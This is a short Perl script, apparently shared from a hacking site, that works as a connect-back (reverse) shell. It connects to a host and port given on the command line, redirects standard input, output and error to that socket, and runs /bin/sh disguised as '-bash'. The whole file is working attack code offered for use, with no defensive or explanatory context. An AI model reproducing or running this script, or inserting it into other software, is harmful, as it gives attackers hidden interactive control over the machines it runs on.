#!/usr/bin/perl
# ConnectBackShell in Perl. Shadow120 - w4ck1ng.com

use Socket;

$host = $ARGV[0];
$port = $ARGV[1];

    if (!$ARGV[0]) {
  printf "[!] Usage: perl script.pl <Host> <Port>\n";
  exit(1);
}
print "[+] Connecting to $host\n";
$prot = getprotobyname('tcp'); # You can change this if needs be
socket(SERVER, PF_INET, SOCK_STREAM, $prot) || die ("[-] Unable to Connect !");
if (!connect(SERVER, pack "SnA4x8", 2, $port, inet_aton($host))) {die("[-] Unable to Connect !");}
  open(STDIN,">&SERVER");
  open(STDOUT,">&SERVER");
  open(STDERR,">&SERVER");
  exec {'/bin/sh'} '-bash' . "\0" x 4;